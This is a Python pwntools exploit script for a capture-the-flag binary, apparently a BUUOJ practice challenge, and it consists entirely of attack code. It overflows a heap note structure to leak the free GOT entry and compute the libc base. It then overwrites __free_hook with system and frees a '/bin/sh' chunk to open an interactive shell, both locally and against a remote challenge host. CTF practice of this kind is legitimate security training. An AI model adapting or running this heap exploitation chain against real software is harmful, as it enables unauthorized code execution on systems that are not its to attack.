#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./pwn1'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',26459)
			elf=ELF(elfelf)
			libc=ELF('../../x64libc/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(b,c):
			io.sendlineafter('>> ','1')
			io.sendlineafter(':',b)
			io.sendlineafter(':',c)
			io.sendlineafter('?',str(len(b)))

		def edit(a,b,c,d):
			io.sendlineafter('>> ','3')
			io.sendlineafter('?',str(a))
			io.sendlineafter(':',b)
			io.sendlineafter('(y/n)',c)
			if c =='y':
				io.sendlineafter(':',d)
			io.sendlineafter('?',str(len(b)))

		def show():
			io.sendlineafter('>> ','2')

		def delete(a):
			io.sendlineafter('>> ','4')
			io.sendlineafter('?',str(a))

		add('a'*1,'bbbbb')
		add('/bin/sh\x00'*2,'bbbbb')
		# delete(0)
		edit(0,'a'*0x48+p64(elf.got['free']),'n','asd')
		show()
		
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['free']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']

		edit(0,'a'*0x48+p64(libc.sym['__free_hook']),'y',p64(system_addr))

		delete(1)


		
		success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue